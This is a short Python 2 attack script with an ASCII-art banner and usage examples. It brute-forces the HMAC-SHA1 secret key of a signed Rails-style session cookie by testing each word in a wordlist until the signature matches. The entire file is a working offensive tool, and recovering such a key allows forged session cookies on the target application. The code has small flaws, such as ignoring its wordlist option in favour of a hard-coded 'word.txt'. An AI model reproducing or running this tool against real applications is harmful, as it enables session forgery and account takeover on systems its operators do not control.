import hmac
import hashlib
import urllib
from optparse import OptionParser


def brutekey(s,m):    
    return hmac.new(s,m,hashlib.sha1).hexdigest()

parse=OptionParser("""



 __                              __                 ______                                        
/  |                            /  |               /      \                                       
$$ |____    ______   __    __  _$$ |_     ______  /$$$$$$  |______    ______    _______   ______  
$$      \  /      \ /  |  /  |/ $$   |   /      \ $$ |_ $$//      \  /      \  /       | /      \ 
$$$$$$$  |/$$$$$$  |$$ |  $$ |$$$$$$/   /$$$$$$  |$$   |  /$$$$$$  |/$$$$$$  |/$$$$$$$/ /$$$$$$  |
$$ |  $$ |$$ |  $$/ $$ |  $$ |  $$ | __ $$    $$ |$$$$/   $$ |  $$ |$$ |  $$/ $$ |      $$    $$ |
$$ |__$$ |$$ |      $$ \__$$ |  $$ |/  |$$$$$$$$/ $$ |    $$ \__$$ |$$ |      $$ \_____ $$$$$$$$/ 
$$    $$/ $$ |      $$    $$/   $$  $$/ $$       |$$ |    $$    $$/ $$ |      $$       |$$       |
$$$$$$$/  $$/        $$$$$$/     $$$$/   $$$$$$$/ $$/      $$$$$$/  $$/        $$$$$$$/  $$$$$$$/ 
                                                                                                  
                                                                                                  
                                                                                                                                                   __            __                           
                                                    /  |          /  |                          
  _______   ______    _______   ______    ______   _$$ |_         $$ |   __   ______   __    __ 
 /       | /      \  /       | /      \  /      \ / $$   |        $$ |  /  | /      \ /  |  /  |
/$$$$$$$/ /$$$$$$  |/$$$$$$$/ /$$$$$$  |/$$$$$$  |$$$$$$/         $$ |_/$$/ /$$$$$$  |$$ |  $$ |
$$      \ $$    $$ |$$ |      $$ |  $$/ $$    $$ |  $$ | __       $$   $$<  $$    $$ |$$ |  $$ |
 $$$$$$  |$$$$$$$$/ $$ \_____ $$ |      $$$$$$$$/   $$ |/  |      $$$$$$  \ $$$$$$$$/ $$ \__$$ |
/     $$/ $$       |$$       |$$ |      $$       |  $$  $$/       $$ | $$  |$$       |$$    $$ |
$$$$$$$/   $$$$$$$/  $$$$$$$/ $$/        $$$$$$$/    $$$$/        $$/   $$/  $$$$$$$/  $$$$$$$ |
                                                                                      /  \__$$ |
                                                                                      $$    $$/ 
                                                                                       $$$$$$/  

[ @intx0x80 ]

./brutekey.py -c BAh7B0kiD3Nlc3Npb25faWQGOgZFRiJFNjYzYjQ1YTQxZDk1ZGZiMTBiZTA1%0A..... -f word.txt 
./brutekey.py --cookie  BAh7B0kiD3Nlc3Npb25faWQGOgZFRiJFNjYzYjQ1YTQxZDk1ZGZiMTBiZTA1%0A..... --file  word.txt 

"""
)



parse.add_option("-c","--cookie",dest="C",type="string",help="Cookies")          
parse.add_option("-f","--file",dest="F",type="string",help="wordlist")


(opt,args)=parse.parse_args()
if opt.C==None and opt.F==None:
    print(parse.usage)
    exit(0)


else:
    msg=str(opt.C)
    file=str(opt.F)
    m=msg.split("--")
    decodeurl=urllib.unquote(m[0])
    f=open("word.txt","r")
    print "\n\nPlease Wait ... \n\n"
    for i in f.readlines():
        i=i.strip("\n")
        if brutekey(i.rstrip("\n"),decodeurl)==m[1]:
            print ("Found Secret  Key [{}]".format(i))

    


